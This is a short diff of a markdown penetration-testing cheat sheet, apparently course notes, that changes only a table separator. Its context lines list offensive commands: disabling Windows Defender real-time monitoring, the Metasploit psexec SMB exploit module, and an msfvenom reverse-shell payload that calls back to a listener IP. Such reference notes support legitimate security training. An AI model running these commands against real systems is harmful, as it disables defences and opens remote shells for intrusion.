@@ -25,7 +25,7 @@ tags:
 | `Set-MpPreference -DisableRealtimeMonitoring $true` | Powershell command using to disable real time monitoring in `Windows Defender`. |
 
 |**Command**|**Description**|
-|-|-|
+|--|--|
 | `use exploit/windows/smb/psexec ` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`. |
 | `shell` | Command used in a meterpreter shell session to drop into a `system shell`. |
 | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`. |
